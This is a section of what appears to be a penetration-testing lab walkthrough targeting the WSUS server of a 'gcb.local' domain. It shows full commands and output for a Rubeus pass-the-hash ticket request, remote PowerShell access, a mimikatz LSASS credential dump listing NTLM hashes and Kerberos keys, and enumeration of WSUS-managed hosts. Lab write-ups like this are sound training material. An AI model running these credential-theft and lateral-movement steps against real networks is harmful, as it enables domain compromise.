---
layout: default
---

## gcb-wsus.gcb.local

With Enterprise Admin privileges, It's possible to detect and access the gcb-wsus machine that is in charge of updated software across the company.


### 1. Access with Enterprise Admin privileges

With Rubeus request a ticket to gcb.local domain for user Administrator user:

```
PS C:\Windows\system32> C:\Rubeus.exe asktgt /user:Administrator /domain:gcb.local /ntlm:f1498c1d1a036c796d0093b2eeae02e2 /ptt
C:\Rubeus.exe asktgt /user:Administrator /domain:gcb.local /ntlm:f1498c1d1a036c796d0093b2eeae02e2 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: f1498c1d1a036c796d0093b2eeae02e2
[*] Building AS-REQ (w/ preauth) for: 'gcb.local\Administrator'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      LmxvY2Fs
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/gcb.local
  ServiceRealm             :  GCB.LOCAL
  UserName                 :  Administrator
  UserRealm                :  GCB.LOCAL
  StartTime                :  7/11/2024 10:38:28 AM
  EndTime                  :  7/11/2024 8:38:28 PM
  RenewTill                :  7/18/2024 10:38:28 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  ut5um9eOYQgFDm6Xw7x9EQ==
  ASREP (key)              :  F1498C1D1A036C796D0093B2EEAE02E2
```

With Enterprise Admin privileges, access to the target server

```
PS C:\Windows\system32> Enter-PSSession -ComputerName gcb-wsus.gcb.local
Enter-PSSession -ComputerName gcb-wsus.gcb.local
[gcb-wsus.gcb.local]: PS C:\Users\Administrator.GCB\Documents> whoami
whoami
gcb\administrator
[gcb-wsus.gcb.local]: PS C:\Users\Administrator.GCB\Documents> hostname
hostname
gcb-wsus
```

### 3. Disable AV and Dump Lsass process

```
[gcb-wsus.gcb.local]: PS C:\Users\Administrator.GCB\Documents> C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
C:\mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 890534 (00000000:000d96a6)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:52:22 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 126692 (00000000:0001eee4)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:05 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 48783 (00000000:0000be8f)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : GCB-WSUS$
Domain            : GCB
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : gcb-wsus$
         * Domain   : GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 29335 (00000000:00007297)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 919566 (00000000:000e080e)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : GCB-WSUS
Logon Server      : GCB-WSUS
Logon Time        : 4/28/2024 11:52:26 PM
SID               : S-1-5-21-1769097882-3627488789-60779913-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : GCB-WSUS
         * NTLM     : 56a56b05372f3a2e6346f17ff0cd063c
         * SHA1     : 500a2c442d210da0166d8a60ac503659c54e0e6a
         * DPAPI    : 500a2c442d210da0166d8a60ac503659
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : GCB-WSUS
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : GCB-WSUS
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 890515 (00000000:000d9693)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:52:22 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 888098 (00000000:000d8d22)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:52:22 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:04 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:58 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 48878 (00000000:0000beee)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 29326 (00000000:0000728e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : GCB-WSUS$
         * Domain   : gcb.local
         * Password : ec fd 10 f6 22 c9 bc ea df 62 ff f7 cb 34 87 79 be 74 c3 76 63 21 02 46 04 a4 1f bb d9 ae 50 3a 4f 6d aa 7e c4 0c 96 34 f4 09 f1 e7 81 9a ed 57 b8 44 85 24 85 66 4c de 08 9b e7 6b c5 2b 85 7d 3d b2 45 23 d5 01 38 34 47 18 21 c0 75 42 72 48 26 ad 8c f5 8c 71 ad 36 1d 5e ea e9 a2 12 b2 4c f1 2a 65 d9 70 b1 3e 58 0b e4 33 f9 cc 43 95 0d 06 c3 9b 14 00 83 95 13 27 36 8d 44 b9 3b 72 d4 f1 24 6f 08 a4 24 3b 09 c2 1e 21 5c c8 58 9b 31 e7 ab ea 45 c7 4b b5 a1 d1 09 88 27 6d 69 4b 0c e8 12 4c f1 b3 06 38 07 65 87 53 5c 89 35 a4 54 cb b2 b6 a6 00 fb c6 86 64 33 75 a4 16 88 52 1e ae 3f de c3 6e df d3 ac 2c 51 9f 97 9a 93 67 48 33 b3 ad 85 9f f2 1e 04 f9 b8 5f f2 5c 71 d6 0d e7 25 5a aa 0c 55 cd 4d ed ba 1f d9 46 e5 17 2d
        ssp :
        credman :

Authentication Id : 0 ; 27473 (00000000:00006b51)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:57 PM
SID               :
        msv :
         [00000003] Primary
         * Username : GCB-WSUS$
         * Domain   : GCB
         * NTLM     : e0495ab8e77580009fd7fbb45606170c
         * SHA1     : c14835764d9197da398e5280764d8e7e10656705
         * DPAPI    : c14835764d9197da398e5280764d8e7e
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : GCB-WSUS$
Domain            : GCB
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:56 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : GCB-WSUS$
         * Domain   : GCB
         * Password : (null)
        kerberos :
         * Username : gcb-wsus$
         * Domain   : GCB.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
[gcb-wsus.gcb.local]: PS C:\Users\Administrator
```


### 3. Enumerate wsus connected computers

with powershell cmdlet Get-WsusComputer It's possible enumerate the connected computers to wsus server:

```
[gcb-wsus.gcb.local]: PS C:\Users\Administrator.GCB\Documents> Get-WsusComputer -All

Computer  IP Address    Operating System             Last Status Report
--------  ----------    ----------------             ------------------
vault-srv 192.168.149.1 Windows Server 2019 Standard 7/19/2024 7:01:49 PM

```


[back](./section8.html)
